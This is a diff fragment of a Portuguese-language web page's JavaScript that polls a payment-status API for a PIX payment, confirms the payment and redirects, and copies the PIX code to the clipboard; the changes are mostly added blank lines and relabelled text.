 
 
       try {
 
+
         const response =
           await fetch(
+
             PAYMENT_STATUS_API_URL,
+
             {
+
               method:
                 "POST",
+
 
               mode:
                 "cors",
 
+
               cache:
                 "no-store",
 
+
               headers: {
+
 
                 "Content-Type":
                   "application/json",
 
+
                 "Accept":
                   "application/json"
+
+
               },
+
 
               body:
                 JSON.stringify({
 
+
                   payment_id:
                     currentPaymentId
 
+
                 })
+
+
             }
+
           );
+
 
 
         const responseText =
           await response.text();
 
 
+
         let data;
 
 
+
         try {
+
 
           data =
             JSON.parse(
               responseText
             );
 
+
         } catch {
+
 
           console.warn(
             "Rapid-worker retornou resposta inválida:",
             responseText
           );
 
+
           return;
+
+
         }
+
 
 
         console.log(
@@ -1261,20 +2271,22 @@
         );
 
 
-        // ======================================================
-        // NÃO ENCONTRADO AINDA
-        // ======================================================
 
         if (
           response.status ===
           404
         ) {
 
+
           checkingMessage.textContent =
             "⏳ Aguardando registro...";
 
+
           return;
+
+
         }
+
 
 
         if (
@@ -1282,40 +2294,59 @@
           !data.success
         ) {
 
+
           console.warn(
             "Falha temporária na consulta:",
             data
           );
 
+
           return;
+
+
         }
+
 
 
         const currentStatus =
           String(
+
             data.payment_status ||
+
             data.status ||
+
             ""
+
           ).toUpperCase();
 
 
+
         // ======================================================
-        // RECEIVED
+        // CONFIRMADO
         // ======================================================
 
         if (
+
           data.paid ===
             true ||
+
           currentStatus ===
             "RECEIVED" ||
+
           currentStatus ===
             "CONFIRMED"
+
         ) {
+
 
           confirmarPagamento();
 
+
           return;
+
+
         }
+
 
 
         // ======================================================
@@ -1327,28 +2358,42 @@
           "PENDING"
         ) {
 
+
           checkingMessage.textContent =
             "⏳ Aguardando confirmação...";
 
+
           return;
+
+
         }
 
 
+
         checkingMessage.textContent =
+
           "Status atual: " +
+
           currentStatus;
+
 
 
       } catch (
         error
       ) {
 
+
         console.warn(
           "Falha temporária ao consultar status:",
           error
         );
+
+
       }
+
+
     }
+
 
 
     // ==========================================================
@@ -1357,32 +2402,45 @@
 
     function confirmarPagamento() {
 
+
       if (
         paymentConfirmed
       ) {
+
+
         return;
+
+
       }
+
 
 
       paymentConfirmed =
         true;
 
 
+
       if (
         statusTimer
       ) {
+
 
         clearInterval(
           statusTimer
         );
 
+
         statusTimer =
           null;
+
+
       }
+
 
 
       checkingMessage.textContent =
         "✅ Participação confirmada!";
+
 
 
       showStatus(
@@ -1392,24 +2450,35 @@
       );
 
 
+
       copyButton.disabled =
         true;
 
 
+
       copyButton.textContent =
-        "✅ Confirmado";
+        "✅ CONFIRMADO";
+
 
 
       setTimeout(
+
         () => {
+
 
           window.location.href =
             RESULT_URL;
 
+
         },
+
         2000
+
       );
+
+
     }
+
 
 
     // ==========================================================
@@ -1418,66 +2487,94 @@
 
     async function copiarPix() {
 
+
       const codigo =
         pixCode.value
-          .trim();
+        .trim();
+
 
 
       if (!codigo) {
+
 
         alert(
           "O código ainda não está disponível."
         );
 
+
         return;
+
+
       }
+
 
 
       try {
 
+
         await navigator
-          .clipboard
-          .writeText(
-            codigo
-          );
+        .clipboard
+        .writeText(
+          codigo
+        );
+
 
 
         copyButton.textContent =
-          "✅ Código copiado!";
+          "✅ CÓDIGO COPIADO!";
+
 
 
         setTimeout(
+
           () => {
+
 
             if (
               !paymentConfirmed
             ) {
 
+
               copyButton.textContent =
-                "📋 Copiar PIX";
+                "📋 COPIAR PIX";
+
+
             }
 
+
           },
+
           2000
+
         );
+
 
 
       } catch {
 
+
         pixCode.focus();
 
+
         pixCode.select();
+
 
         document.execCommand(
           "copy"
         );
 
 
+
         alert(
           "Código copiado!"
         );
+
+
       }
+
+
     }
+
 
 
     // ==========================================================
@@ -1496,22 +2593,27 @@
     );
 
 
+
     // ==========================================================
     // INICIAR
     // ==========================================================
 
     function iniciar() {
 
+
       if (
         !paymentOptionId
       ) {
+
 
         payerArea.style.display =
           "none";
 
 
+
         choiceName.textContent =
           "Nenhuma escolha foi informada";
+
 
 
         showStatus(
@@ -1521,8 +2623,12 @@
         );
 
 
+
         return;
+
+
       }
+
 
 
       const nome =
@@ -1531,14 +2637,18 @@
         ];
 
 
+
       if (!nome) {
+
 
         payerArea.style.display =
           "none";
 
 
+
         choiceName.textContent =
           "Opção desconhecida";
+
 
 
         showStatus(
@@ -1548,13 +2658,20 @@
         );
 
 
+
         return;
+
+
       }
+
 
 
       choiceName.textContent =
         nome;
+
+
     }
+
 
 
     // ==========================================================
@@ -1563,7 +2680,10 @@
 
     iniciar();
 
+
   </script>
 
+
 </body>
+
 </html>
